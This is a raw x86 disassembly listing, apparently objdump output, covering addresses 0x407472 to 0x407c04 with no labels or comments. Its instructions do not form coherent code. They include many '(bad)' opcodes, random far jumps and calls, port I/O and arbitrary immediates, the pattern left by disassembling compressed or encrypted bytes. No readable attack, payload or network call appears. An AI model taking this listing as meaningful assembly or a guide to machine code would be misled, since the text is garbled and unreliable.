  407472:	mov    al,0x60
  407474:	add    dh,BYTE PTR [edx]
  407476:	out    dx,al
  407477:	jae    0x407416
  407479:	popa   
  40747a:	ja     0x4074b1
  40747c:	sbb    dl,BYTE PTR [edx-0x3507ed1f]
  407482:	enter  0x336e,0x82
  407486:	div    BYTE PTR [esp+ebx*1+0x46]
  40748a:	xchg   esp,eax
  40748b:	mov    ch,BYTE PTR [edi]
  40748d:	mov    bh,BYTE PTR [ebx-0x7584e803]
  407493:	sub    esp,DWORD PTR [ebx+0x3aecbf27]
  407499:	cli    
  40749a:	push   eax
  40749b:	sti    
  40749c:	(bad)  
  40749d:	pop    es
  40749e:	test   BYTE PTR [edi],0x0
  4074a1:	pop    edx
  4074a2:	pop    edi
  4074a3:	es (bad) 
  4074a6:	or     edx,ebx
  4074a8:	loop   0x40746d
  4074aa:	enter  0x4257,0x92
  4074ae:	cmp    esi,DWORD PTR [ebx]
  4074b0:	(bad)  
  4074b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b3:	ss jp  0x407510
  4074b6:	cmp    esi,DWORD PTR [eax+0x128be07d]
  4074bc:	clc    
  4074bd:	sub    eax,0xf23eff59
  4074c2:	and    eax,0x3b93480f
  4074c7:	and    al,BYTE PTR [ebx]
  4074c9:	leave  
  4074ca:	repnz jmp 0x94c2:0xe12b58e4
  4074d2:	sbb    eax,0xb4c90af1
  4074d7:	stos   DWORD PTR es:[edi],eax
  4074d8:	xchg   esi,eax
  4074d9:	aam    0xf8
  4074db:	out    0x60,al
  4074dd:	mov    al,BYTE PTR [ecx]
  4074df:	cdq    
  4074e0:	iret   
  4074e1:	stos   DWORD PTR es:[edi],eax
  4074e2:	mul    BYTE PTR [ebx-0x65]
  4074e5:	imul   ecx,DWORD PTR [esi],0x41
  4074e8:	les    edi,FWORD PTR [edx+eiz*1+0x71fa15a5]
  4074ef:	sbb    DWORD PTR [ebp-0xe],0xce7a9774
  4074f6:	add    al,0x9c
  4074f8:	cmp    BYTE PTR [edi],cl
  4074fa:	pop    edx
  4074fb:	mov    cl,0x9a
  4074fd:	cmp    ebp,DWORD PTR [edx-0x2fc6c212]
  407503:	add    DWORD PTR [esi],eax
  407505:	adc    al,0x6f
  407507:	out    dx,al
  407508:	dec    esp
  407509:	outs   dx,BYTE PTR ds:[esi]
  40750a:	dec    ebx
  40750b:	test   eax,0x1ab8b1d9
  407510:	fisubr WORD PTR [edi+edx*1]
  407513:	jecxz  0x4074de
  407515:	mov    ebx,0xfafdc687
  40751a:	dec    esp
  40751b:	xchg   edi,edi
  40751d:	cmp    edi,ebx
  40751f:	dec    edi
  407520:	data16 cs jbe 0x40755d
  407524:	nop
  407525:	dec    ebx
  407526:	bound  esp,QWORD PTR ds:0x33d4ad44
  40752c:	add    al,0x8b
  40752e:	mov    ebp,0xf72978be
  407533:	pop    ecx
  407534:	jmp    0x57c1:0x6fc4fa09
  40753b:	mov    edi,0x2f47808
  407540:	test   esp,ecx
  407542:	sub    eax,0x6b09415f
  407547:	jle    0x40755a
  407549:	add    DWORD PTR [eax],edx
  40754b:	push   ebx
  40754c:	add    DWORD PTR ds:0xb60f19c,ebx
  407552:	sbb    ebx,DWORD PTR [eax-0x39]
  407555:	jge    0x407541
  407557:	xlat   BYTE PTR ds:[ebx]
  407558:	mov    bh,0x7f
  40755a:	lea    eax,[edi-0x55a114d7]
  407560:	loopne 0x407550
  407562:	aas    
  407563:	pop    edx
  407564:	cwde   
  407565:	push   cs
  407566:	cmp    al,0x21
  407568:	jge    0x40753c
  40756a:	adc    bh,BYTE PTR ds:0x1306a419
  407570:	dec    esi
  407571:	hlt    
  407572:	sbb    esp,ebp
  407574:	push   ds
  407575:	je     0x4075c1
  407577:	ja     0x40754a
  407579:	jle    0x4075d5
  40757b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40757c:	xchg   ecx,ecx
  40757e:	jecxz  0x4075d5
  407580:	dec    ecx
  407581:	add    al,0x82
  407583:	cld    
  407584:	outs   dx,BYTE PTR ds:[esi]
  407585:	jle    0x407527
  407587:	push   ds
  407588:	popf   
  407589:	das    
  40758a:	mov    ch,0x9
  40758c:	out    0x64,al
  40758e:	adc    eax,0xa6654843
  407593:	test   al,0x3a
  407595:	(bad)  
  407596:	aas    
  407597:	jnp    0x4075ca
  407599:	xor    BYTE PTR [ebx],dl
  40759b:	inc    ebp
  40759c:	add    DWORD PTR [esi],edx
  40759e:	jae    0x407567
  4075a0:	push   edi
  4075a1:	jmp    0xae52:0x1f147fc9
  4075a8:	xor    dl,BYTE PTR [edi]
  4075aa:	jno    0x407555
  4075ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ad:	jne    0x4075ea
  4075af:	mov    ch,0xc7
  4075b1:	cmp    al,0x61
  4075b3:	inc    ecx
  4075b4:	inc    esi
  4075b5:	mov    dl,BYTE PTR [ebp-0x3e3568e2]
  4075bb:	jo     0x407629
  4075bd:	mov    dl,0xb7
  4075bf:	iret   
  4075c0:	fwait
  4075c1:	repnz adc cl,BYTE PTR [ecx+ebp*1]
  4075c5:	jbe    0x4075de
  4075c7:	mov    ds:0x52cae094,al
  4075cc:	sub    al,0x8e
  4075ce:	(bad)
  4075d2:	stos   BYTE PTR es:[edi],al
  4075d3:	mov    dh,0xbc
  4075d5:	mov    edx,0xd3af0546
  4075da:	pop    esp
  4075db:	sti    
  4075dc:	test   BYTE PTR [edi+0x56],0xeb
  4075e0:	je     0x407652
  4075e2:	mov    ds:0x217e866b,eax
  4075e7:	repnz xchg edi,eax
  4075e9:	add    DWORD PTR [edx+eax*1],0xc4a617a4
  4075f0:	jno    0x407590
  4075f2:	or     eax,DWORD PTR [ebp+0x3b]
  4075f5:	mov    ecx,0xef011ac6
  4075fa:	sub    edx,esp
  4075fc:	cwde   
  4075fd:	loope  0x407591
  4075ff:	loop   0x407662
  407601:	jo     0x4075e5
  407603:	and    ebp,edi
  407605:	arpl   si,ax
  407607:	lahf   
  407608:	sbb    al,0xf
  40760a:	sub    ch,BYTE PTR [edi]
  40760c:	shl    bl,1
  40760e:	fld1   
  407610:	cmp    ecx,DWORD PTR [edx*2-0x40b6c856]
  407617:	jg     0x40766b
  407619:	pop    esi
  40761a:	jbe    0x407647
  40761c:	loop   0x4075ac
  40761e:	push   esp
  40761f:	push   ds
  407620:	and    bh,BYTE PTR [ebx+0x42]
  407623:	rep ins DWORD PTR es:[edi],dx
  407625:	pop    ebp
  407626:	or     eax,esi
  407628:	sub    eax,0x714f5742
  40762d:	push   ecx
  40762e:	mov    dl,0xa3
  407630:	fcmove st,st(0)
  407632:	adc    BYTE PTR [edx-0x3bb0b0cc],cl
  407638:	jl     0x4075ea
  40763a:	js     0x4075ff
  40763c:	cmp    eax,0x660a852c
  407641:	mov    es,WORD PTR [esi-0x7b27da88]
  407647:	(bad)  
  407648:	sbb    edx,DWORD PTR [ebx+0x6c]
  40764b:	sub    al,0x60
  40764d:	or     eax,0x991c2c57
  407652:	cld    
  407653:	add    bh,bl
  407655:	xor    al,0xdc
  407657:	inc    esi
  407658:	pop    es
  407659:	mov    cl,0x4c
  40765b:	jne    0x407636
  40765d:	cmp    bh,ch
  40765f:	pop    ebp
  407660:	sbb    BYTE PTR [edx],bh
  407662:	jb     0x4075f3
  407664:	shl    DWORD PTR [esi],0x2c
  407667:	data16 hlt 
  407669:	sub    edx,DWORD PTR [esi+0x3abff873]
  40766f:	sub    bh,BYTE PTR [esi-0xd]
  407672:	lods   eax,DWORD PTR ds:[esi]
  407673:	or     BYTE PTR [esi],cl
  407675:	add    dl,cl
  407677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407678:	fcmovnb st,st(2)
  40767a:	repnz fsub DWORD PTR [ebp-0x4b]
  40767e:	inc    edx
  40767f:	aaa    
  407680:	xadd   ch,bl
  407683:	push   0xffffffed
  407685:	out    0xed,al
  407687:	fstp   TBYTE PTR [edi+0x4f1e53c]
  40768d:	xchg   esp,eax
  40768e:	outs   dx,DWORD PTR ds:[esi]
  40768f:	adc    BYTE PTR [esi+0x51b9af4f],0x5d
  407696:	stos   BYTE PTR es:[edi],al
  407697:	push   ecx
  407698:	cs xor al,0x7a
  40769b:	in     eax,dx
  40769c:	dec    ebx
  40769d:	mov    DWORD PTR [edx+0x1f],esi
  4076a0:	(bad)  
  4076a2:	scas   al,BYTE PTR es:[edi]
  4076a3:	jge    0x407720
  4076a5:	or     BYTE PTR [ebx+edx*1+0x49],al
  4076a9:	cmp    eax,0xe127ed70
  4076ae:	call   0xabd756a9
  4076b3:	sub    ch,bl
  4076b5:	mov    cs,WORD PTR ds:0x394f
  4076ba:	lea    edx,[ebp+0x5bc7de12]
  4076c0:	leave  
  4076c1:	xchg   esi,eax
  4076c2:	xchg   ebp,eax
  4076c3:	pop    esp
  4076c4:	xchg   esi,eax
  4076c5:	bound  ebp,QWORD PTR [eax]
  4076c7:	je     0x407731
  4076c9:	mov    WORD PTR [eax],ss
  4076cb:	shl    DWORD PTR [edi-0x3e],0xd9
  4076cf:	lods   eax,DWORD PTR ds:[esi]
  4076d0:	pop    ebp
  4076d1:	scas   eax,DWORD PTR es:[edi]
  4076d2:	orps   xmm7,xmm1
  4076d5:	jnp    0x4076e8
  4076d7:	push   ecx
  4076d8:	push   ebx
  4076d9:	addr16 adc eax,0x9b8d7b1c
  4076df:	or     BYTE PTR [esi+esi*8+0x64c7cfc6],dl
  4076e6:	mov    edi,0xe4a4a9b7
  4076eb:	pushf  
  4076ec:	daa    
  4076ed:	ret    
  4076ee:	mov    DWORD PTR [edx+eax*4],ebp
  4076f1:	add    eax,0x81d15970
  4076f6:	jp     0x4076e2
  4076f8:	inc    edi
  4076f9:	ins    DWORD PTR es:[edi],dx
  4076fa:	mov    ah,0xc1
  4076fc:	jp     0x40777a
  4076fe:	ffree  st(5)
  407700:	fld    st(5)
  407702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407703:	ds cli 
  407705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407706:	call   0xfe2e:0x226d5699
  40770d:	push   0xfffffff1
  40770f:	jg     0x40773c
  407711:	addr16 je 0x4076af
  407714:	(bad)  
  407715:	jmp    0x7ffc1871
  40771a:	add    BYTE PTR [esi+0x1fe323f0],cl
  407720:	(bad)  
  407721:	(bad)  
  407722:	adc    edx,edx
  407724:	and    DWORD PTR [eax],edx
  407726:	popa   
  407727:	loopne 0x40778b
  407729:	mov    DWORD PTR [ebx-0x17eab8de],ebx
  40772f:	jp     0x4076bc
  407731:	pop    ebx
  407732:	mov    edx,0x617c7f1f
  407737:	add    esi,esi
  407739:	(bad)  
  40773a:	(bad)  
  40773b:	push   cs
  40773c:	cs pop edx
  40773e:	mov    ebp,0x182a01
  407743:	xchg   edx,eax
  407744:	stc    
  407745:	push   ebp
  407746:	mov    esi,0xab1ab786
  40774b:	mov    cl,0x4c
  40774d:	lock xor al,0xda
  407750:	(bad)  
  407751:	lock mov ecx,0x6bfd1310
  407757:	aas    
  407758:	jle    0x4077d0
  40775a:	inc    edx
  40775b:	(bad)  
  40775c:	cs xor al,0xc7
  40775f:	sub    al,dl
  407761:	pop    eax
  407762:	push   esp
  407763:	std    
  407764:	mov    al,ds:0xe9fff7c5
  407769:	xlat   BYTE PTR ds:[ebx]
  40776a:	in     eax,0xef
  40776c:	dec    esi
  40776d:	pop    es
  40776e:	(bad)  
  40776f:	and    al,0xe8
  407771:	xchg   ebx,eax
  407772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407773:	out    dx,eax
  407774:	lea    ebx,[edi-0x4e1c2fee]
  40777a:	scas   al,BYTE PTR es:[edi]
  40777b:	and    eax,0xebaeae1a
  407780:	pop    ss
  407781:	pop    ebx
  407782:	fwait
  407783:	jle    0x407747
  407785:	inc    edx
  407786:	imul   BYTE PTR [ecx-0x3ed67374]
  40778c:	retf   0xdcd3
  40778f:	mov    edi,0xd66c7acc
  407794:	sub    DWORD PTR [esi],ebx
  407796:	cmp    dl,BYTE PTR [ecx-0x48995304]
  40779c:	mov    ecx,0x17cf20bd
  4077a1:	repnz add ebp,DWORD PTR [edi-0x44]
  4077a5:	stos   DWORD PTR es:[edi],eax
  4077a6:	ja     0x40775c
  4077a8:	inc    ebx
  4077a9:	jge    0x407792
  4077ab:	and    bl,cl
  4077ad:	dec    edx
  4077ae:	sub    DWORD PTR [eax],ecx
  4077b0:	mov    ch,0xfa
  4077b2:	mov    bl,0x22
  4077b4:	(bad)  
  4077b5:	(bad)  
  4077b6:	xor    al,0x3f
  4077b8:	cmp    cl,BYTE PTR [ebx]
  4077ba:	bound  eax,QWORD PTR [esi+0x465cc381]
  4077c0:	pop    ecx
  4077c1:	xchg   esp,eax
  4077c2:	les    edi,FWORD PTR [ecx+0x1254639f]
  4077c8:	gs inc ecx
  4077ca:	or     al,0xf7
  4077cc:	sbb    cl,BYTE PTR [edx]
  4077ce:	shl    al,1
  4077d0:	clc    
  4077d1:	je     0x4077bb
  4077d3:	repnz sti 
  4077d5:	lds    esp,FWORD PTR [ebx+0x203aa7d2]
  4077db:	or     al,0x31
  4077dd:	xchg   edx,eax
  4077de:	xor    DWORD PTR [ebx],eax
  4077e0:	jno    0x4077b9
  4077e2:	outs   dx,BYTE PTR ds:[esi]
  4077e3:	adc    al,0xa0
  4077e5:	scas   eax,DWORD PTR es:[edi]
  4077e6:	jmp    0x3d67:0x87198309
  4077ed:	push   0xffffffe9
  4077ef:	fdiv   st,st(1)
  4077f1:	and    al,0x63
  4077f3:	not    BYTE PTR [ecx-0x1c]
  4077f6:	dec    eax
  4077f7:	push   edx
  4077f8:	sub    al,0xca
  4077fa:	fisub  WORD PTR [esi+0x7193eae]
  407800:	stos   BYTE PTR es:[edi],al
  407801:	mov    ds:0x8f98c129,al
  407806:	inc    ecx
  407807:	ins    BYTE PTR es:[edi],dx
  407808:	and    WORD PTR ds:0x5e13deea,cx
  40780f:	push   edx
  407810:	pushf  
  407811:	mov    ch,0xf0
  407813:	lods   al,BYTE PTR ds:[esi]
  407814:	out    dx,eax
  407815:	xchg   edx,eax
  407816:	push   esp
  407817:	or     DWORD PTR ds:0x85c34975,eax
  40781d:	pusha  
  40781e:	ror    BYTE PTR [edx+0x17],0x4
  407822:	out    0x2a,eax
  407824:	mov    dl,0xe3
  407826:	lea    edx,[eax-0x57116864]
  40782c:	scas   eax,DWORD PTR es:[edi]
  40782d:	mov    cl,0x23
  40782f:	in     eax,dx
  407830:	cmc    
  407831:	mov    al,ds:0x2ac6938c
  407836:	mov    ah,0x75
  407838:	sbb    al,0x52
  40783a:	mov    eax,0x2fb0362
  40783f:	xchg   esp,eax
  407840:	jmp    0xecca07d
  407845:	xor    BYTE PTR [edx+0x6113c6af],0x16
  40784c:	push   0xdc99f5ea
  407851:	dec    edx
  407852:	loope  0x4077eb
  407854:	ret    0x8a53
  407857:	mov    ds:0x69dff9a4,al
  40785c:	sub    ebx,ebx
  40785e:	adc    ah,bl
  407860:	sub    DWORD PTR [ecx],ebx
  407862:	cmp    bh,BYTE PTR [eax]
  407864:	mov    ecx,0x3726af26
  407869:	pusha  
  40786a:	mov    ds:0x6c4f7fa3,al
  40786f:	pop    ebx
  407870:	and    cl,bl
  407872:	cmc    
  407873:	ds iretw 
  407876:	xor    BYTE PTR [ecx+eax*8+0x1e],dl
  40787a:	cmc    
  40787b:	mov    cl,BYTE PTR [esi-0x61]
  40787e:	repnz cmp eax,0x7cc13a99
  407884:	or     DWORD PTR [esp+edi*4-0x7c],0xdb3b0104
  40788c:	jecxz  0x407839
  40788e:	clc    
  40788f:	xchg   edx,eax
  407890:	mov    bh,BYTE PTR [esi-0xd]
  407893:	shr    BYTE PTR [ebp-0x53],cl
  407896:	mov    ds:0x92e95e6b,eax
  40789b:	xchg   esp,ebp
  40789d:	xchg   ah,al
  40789f:	clc    
  4078a0:	les    ebx,FWORD PTR [ebx]
  4078a2:	inc    esi
  4078a3:	clc    
  4078a4:	sub    bl,bl
  4078a6:	jmp    0x4078ff
  4078a8:	lahf   
  4078a9:	cld    
  4078aa:	iret   
  4078ab:	cmc    
  4078ac:	scas   al,BYTE PTR es:[edi]
  4078ad:	mov    ebx,0xfb56165e
  4078b2:	adc    dl,BYTE PTR [ebx-0x7e]
  4078b5:	cmp    BYTE PTR [eax+0x6c],bh
  4078b8:	inc    ebx
  4078b9:	jge    0x4078d7
  4078bb:	pop    esi
  4078bc:	push   cs
  4078bd:	pushf  
  4078be:	iret   
  4078bf:	add    al,0x17
  4078c1:	dec    esp
  4078c2:	mov    ch,0x41
  4078c4:	pop    ecx
  4078c5:	pop    edi
  4078c6:	adc    ebp,DWORD PTR [edx]
  4078c8:	jle    0x40787c
  4078ca:	fsub   st,st(7)
  4078cc:	pop    ds
  4078cd:	cli    
  4078ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078cf:	rcr    DWORD PTR [edi],cl
  4078d1:	bound  ebp,QWORD PTR [ecx+ecx*8+0x24665142]
  4078d8:	push   0xfffffffe
  4078da:	sbb    ecx,DWORD PTR [eax+eax*2]
  4078dd:	dec    ebp
  4078de:	les    esp,FWORD PTR [ecx+0x6e3660c9]
  4078e4:	mov    edx,esi
  4078e6:	lahf   
  4078e7:	call   0xec35:0x7bcc8b3e
  4078ee:	fwait
  4078ef:	dec    esi
  4078f0:	loop   0x4078e2
  4078f2:	pop    eax
  4078f3:	nop
  4078f4:	in     al,dx
  4078f5:	dec    eax
  4078f6:	cmp    DWORD PTR [edi+edi*1-0x79],0xffffffc9
  4078fb:	sbb    eax,0x74716946
  407900:	jb     0x4078f2
  407902:	fistp  DWORD PTR [ecx]
  407904:	stos   DWORD PTR es:[edi],eax
  407905:	inc    edi
  407906:	add    BYTE PTR [edi+0x493bc615],dh
  40790c:	xchg   ebx,eax
  40790d:	cmp    dh,BYTE PTR [ebp-0x58]
  407910:	js     0x4078fc
  407912:	sar    BYTE PTR [ecx-0x6934cb0f],cl
  407918:	sbb    esi,esp
  40791a:	push   ds
  40791b:	daa    
  40791c:	js     0x407913
  40791e:	shl    BYTE PTR [eax-0x27],1
  407921:	out    dx,al
  407922:	jle    0x40792c
  407924:	sub    cl,BYTE PTR [edi+0x1d]
  407927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407928:	mov    al,0x4f
  40792a:	call   0x1fca:0x7e50e0b0
  407931:	jnp    0x407926
  407933:	xchg   ecx,eax
  407934:	fldcw  WORD PTR [ecx-0x37f31038]
  40793a:	cmp    dh,BYTE PTR [ecx]
  40793c:	stos   BYTE PTR es:[edi],al
  40793d:	jl     0x407976
  40793f:	cmc    
  407940:	sub    esi,DWORD PTR [ebp-0x20]
  407943:	cdq    
  407944:	int3   
  407945:	aaa    
  407946:	add    al,0xc8
  407948:	adc    BYTE PTR [ebp-0x19835409],0x6e
  40794f:	cmp    esi,DWORD PTR [edi+eiz*2-0x22b4eee8]
  407956:	xchg   BYTE PTR [edi],bh
  407958:	or     DWORD PTR [edi-0x6a],ecx
  40795b:	xor    ah,BYTE PTR [esi]
  40795d:	loop   0x407960
  40795f:	xor    edx,ebp
  407961:	jmp    0x407950
  407963:	fnstcw WORD PTR [esp+ecx*4-0x2305b23e]
  40796a:	add    ebp,DWORD PTR [edx]
  40796c:	inc    ecx
  40796d:	out    dx,eax
  40796e:	gs add eax,0x38df9405
  407974:	add    ebx,edi
  407976:	mov    ds:0x1666cfcd,eax
  40797b:	pop    ecx
  40797c:	inc    esi
  40797d:	std    
  40797e:	inc    esp
  40797f:	adc    al,BYTE PTR [ebx+0x6a]
  407982:	push   ebp
  407983:	jmp    0x4079e0
  407985:	jmp    0x63d4af2a
  40798a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40798b:	icebp  
  40798c:	data16 and al,0xc
  40798f:	loopne 0x40796c
  407991:	inc    eax
  407992:	ror    BYTE PTR [esi],0x81
  407995:	push   es
  407996:	in     al,dx
  407997:	dec    eax
  407998:	pushf  
  407999:	(bad)  
  40799a:	nop
  40799b:	lea    edi,[ecx-0x2a1134c9]
  4079a1:	popa   
  4079a2:	mov    ds:0x825def6d,al
  4079a7:	call   0xdd472be4
  4079ac:	in     al,0x7e
  4079ae:	cmp    DWORD PTR [ebx-0x21d1d763],0xffffffad
  4079b5:	retf   0xa6a
  4079b8:	mov    dl,0x7f
  4079ba:	push   esp
  4079bb:	stos   BYTE PTR es:[edi],al
  4079bc:	aad    0xb4
  4079be:	jns    0x407a15
  4079c0:	push   eax
  4079c1:	push   ecx
  4079c2:	fnstenv [ecx+ebp*4+0x65]
  4079c6:	mov    al,BYTE PTR [eax+0x76]
  4079c9:	cmp    DWORD PTR [ebp+0x477594ac],edi
  4079cf:	aam    0xe4
  4079d1:	sbb    eax,DWORD PTR [ecx-0xc8111f4]
  4079d7:	mov    ah,0xf5
  4079d9:	xchg   esi,eax
  4079da:	jnp    0x407988
  4079dc:	das    
  4079dd:	sub    eax,0x8aa773
  4079e2:	xor    esi,ebx
  4079e4:	paddusw mm0,QWORD PTR [esi-0x7b]
  4079e8:	and    cl,BYTE PTR [edi+edi*8]
  4079eb:	bound  ecx,QWORD PTR [esi-0x4d]
  4079ee:	push   es
  4079ef:	xor    al,0x4f
  4079f1:	push   cs
  4079f2:	inc    ebx
  4079f3:	pusha  
  4079f4:	mov    ah,BYTE PTR [edi+0x3216549b]
  4079fa:	pop    ecx
  4079fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079fc:	dec    ecx
  4079fd:	(bad)  
  4079fe:	hlt    
  4079ff:	outs   dx,BYTE PTR cs:[esi]
  407a01:	loope  0x407984
  407a03:	xor    eax,0xb6dc1a59
  407a08:	xor    DWORD PTR [ecx+0x1c],eax
  407a0b:	daa    
  407a0c:	inc    edi
  407a0d:	stc    
  407a0e:	pop    eax
  407a0f:	dec    ebx
  407a10:	pop    eax
  407a11:	inc    ecx
  407a12:	(bad)  
  407a13:	popf   
  407a14:	ficomp WORD PTR [ebp-0x3b486ee0]
  407a1a:	rcr    bh,0x67
  407a1d:	fsub   DWORD PTR [ebx-0x4b448e3b]
  407a23:	shl    BYTE PTR [eax+0x455cefb9],0xf7
  407a2a:	arpl   WORD PTR [ecx-0x6],dx
  407a2d:	jne    0x4079ca
  407a2f:	fidiv  WORD PTR [esi+0x11]
  407a32:	fs xchg edi,eax
  407a34:	xor    BYTE PTR [edi+0x62],dh
  407a37:	ret    
  407a38:	lea    ebx,[ebx]
  407a3a:	hlt    
  407a3b:	mov    esp,ds
  407a3d:	push   ss
  407a3e:	xchg   ebp,eax
  407a3f:	bound  esp,QWORD PTR [eax-0x6e]
  407a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a43:	mov    bh,0xc
  407a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a46:	adc    BYTE PTR [ebp+0x106de3cf],bh
  407a4c:	or     ebp,DWORD PTR [ecx-0x7a78e1c6]
  407a52:	cdq    
  407a53:	add    edx,edx
  407a55:	mov    al,ds:0xb5ef005f
  407a5a:	dec    esi
  407a5b:	fwait
  407a5c:	and    DWORD PTR [ecx+0x62],edx
  407a5f:	sub    eax,0x84d07aa4
  407a64:	pop    ss
  407a65:	or     eax,0x85631cf4
  407a6a:	pop    eax
  407a6b:	sub    BYTE PTR [eax-0x7517defe],al
  407a71:	pop    es
  407a72:	dec    ecx
  407a73:	adc    DWORD PTR [eax+edx*2-0x4ddf00da],ebx
  407a7a:	test   DWORD PTR [edx+0x39],0x52978a22
  407a81:	push   ebp
  407a82:	xor    al,0xb2
  407a84:	in     eax,0x54
  407a86:	push   esp
  407a87:	cld    
  407a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a89:	mov    ebx,0x555e85ee
  407a8e:	dec    ecx
  407a8f:	or     DWORD PTR [ecx],esi
  407a91:	xor    BYTE PTR [eax+0x2a],cl
  407a94:	mov    fs,WORD PTR [ebx]
  407a96:	sub    DWORD PTR gs:[edi-0x52],ebx
  407a9a:	fldenv [ecx-0x7b9af697]
  407aa0:	into   
  407aa1:	or     BYTE PTR [ecx],0x58
  407aa4:	push   edi
  407aa5:	cmp    al,0xcb
  407aa7:	lods   eax,DWORD PTR ds:[esi]
  407aa8:	imul   DWORD PTR [edi+ebp*4]
  407aab:	cmp    eax,0xde0612a4
  407ab0:	jbe    0x407a7b
  407ab2:	and    ebp,DWORD PTR [edi]
  407ab4:	xchg   ebp,eax
  407ab5:	xchg   ebx,eax
  407ab6:	aad    0x41
  407ab8:	and    esi,DWORD PTR [eax]
  407aba:	std    
  407abb:	repz scas eax,DWORD PTR es:[edi]
  407abd:	data16 adc BYTE PTR [eax-0xd],ah
  407ac1:	push   edi
  407ac2:	sub    DWORD PTR [ebx+0x2a],edi
  407ac5:	out    dx,al
  407ac6:	sub    BYTE PTR [esi+0x1a],0xd0
  407aca:	jae    0x407abd
  407acc:	sbb    eax,0xac4bf689
  407ad1:	popa   
  407ad2:	mov    esi,0xe4c71b0e
  407ad7:	xchg   esp,eax
  407ad8:	out    0xb9,eax
  407ada:	rcl    DWORD PTR [edi-0x7cf91271],1
  407ae0:	repnz mov eax,ds:0xa818ca14
  407ae6:	repnz add edi,eax
  407ae9:	out    0x7c,al
  407aeb:	mov    ebp,0xe7ca8a9a
  407af0:	push   ebx
  407af1:	fsubp  st(5),st
  407af3:	loope  0x407abd
  407af5:	sub    eax,0xebd8d1f9
  407afa:	push   esp
  407afb:	mov    al,ds:0xb9eac486
  407b00:	(bad)  
  407b01:	cli    
  407b02:	xchg   ecx,eax
  407b03:	mov    edx,0xe09ac99c
  407b08:	outs   dx,DWORD PTR ds:[esi]
  407b09:	mov    bh,BYTE PTR [eax]
  407b0b:	fild   DWORD PTR [ecx-0x29]
  407b0e:	fsub   QWORD PTR [ecx-0x39]
  407b11:	lods   ax,WORD PTR ds:[esi]
  407b13:	add    al,0x8f
  407b15:	xchg   ebp,eax
  407b16:	hlt    
  407b17:	in     eax,dx
  407b18:	or     cl,BYTE PTR [ecx]
  407b1a:	push   es
  407b1b:	lds    eax,FWORD PTR [edx+0x21]
  407b1e:	test   DWORD PTR [ebp-0x12bcfb21],eax
  407b24:	lods   eax,DWORD PTR ds:[esi]
  407b25:	das    
  407b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b28:	aaa    
  407b29:	imul   edx,DWORD PTR [ecx-0x1a],0xffffffd7
  407b2d:	and    DWORD PTR [ebx+0x41c22610],0x28ebfd40
  407b37:	sahf   
  407b38:	lods   al,BYTE PTR ds:[esi]
  407b39:	mov    DWORD PTR [ebx+0x592e0140],edx
  407b3f:	or     ebx,ecx
  407b41:	loope  0x407baf
  407b43:	add    eax,0x622bf129
  407b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b49:	shl    BYTE PTR [edx+0x18000a64],1
  407b4f:	sub    cl,BYTE PTR [edi]
  407b51:	ins    BYTE PTR es:[edi],dx
  407b52:	addr16 pop eax
  407b54:	add    eax,0xfb79bc33
  407b59:	lods   al,BYTE PTR ds:[esi]
  407b5a:	pusha  
  407b5b:	or     esi,DWORD PTR [ecx+0x19]
  407b5e:	fisub  WORD PTR ds:0xfdc33e0e
  407b64:	(bad)  
  407b65:	and    bh,BYTE PTR [ebx+0x4e]
  407b68:	add    esi,DWORD PTR [esi+ebp*4+0x9]
  407b6c:	out    dx,eax
  407b6d:	push   edx
  407b6e:	ds arpl ax,bp
  407b71:	push   ss
  407b72:	push   ds
  407b73:	test   al,0xce
  407b75:	xor    esp,DWORD PTR [edi+esi*2]
  407b78:	mov    eax,ds:0x5518d746
  407b7d:	pop    ss
  407b7e:	popa   
  407b7f:	leave  
  407b80:	xor    BYTE PTR [ecx],cl
  407b82:	ins    BYTE PTR es:[edi],dx
  407b83:	aam    0x6f
  407b85:	aaa    
  407b86:	out    0xd,al
  407b88:	shl    BYTE PTR [ebx],0x80
  407b8b:	call   0xa310:0xaf0a98d9
  407b92:	es out dx,eax
  407b94:	(bad)  
  407b95:	stos   DWORD PTR es:[edi],eax
  407b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b97:	inc    esp
  407b98:	push   0x1f1ee5f0
  407b9d:	jecxz  0x407bed
  407b9f:	mov    edi,0x5898b29c
  407ba4:	mov    es,WORD PTR [edi-0x61]
  407ba7:	repz inc edx
  407ba9:	or     eax,0xef0363cb
  407bae:	call   DWORD PTR [edx+0x1f]
  407bb1:	(bad)  
  407bb2:	in     eax,dx
  407bb3:	stos   DWORD PTR es:[edi],eax
  407bb4:	sbb    ecx,ecx
  407bb6:	lea    eax,[ecx+eiz*2+0x2fc1b453]
  407bbd:	retf   
  407bbe:	add    ebp,edi
  407bc0:	imul   esi,DWORD PTR [edx-0x1e980597],0xbfe68ee0
  407bca:	pop    ecx
  407bcb:	pop    ecx
  407bcc:	jg     0x407c13
  407bce:	cdq    
  407bcf:	dec    ecx
  407bd0:	mov    al,0xe8
  407bd2:	iret   
  407bd3:	add    BYTE PTR [ecx+0x9756298],0x84
  407bda:	add    eax,0xc76a45e5
  407bdf:	mov    eax,0x2a736f25
  407be4:	xor    al,0xe7
  407be6:	pop    es
  407be7:	pop    es
  407be8:	nop
  407be9:	lea    ecx,[ebx]
  407beb:	add    al,0x51
  407bed:	cmp    eax,0xa1b9ba6e
  407bf2:	mov    DWORD PTR [eax],eax
  407bf4:	pop    es
  407bf5:	xlat   BYTE PTR ds:[ebx]
  407bf6:	mov    edi,0x19bb2e6d
  407bfb:	mov    edi,0xdeb7d9d7
  407c00:	sbb    al,0x11
  407c02:	cmp    BYTE PTR [edi],dh
  407c04:	cmp    al,0xfd
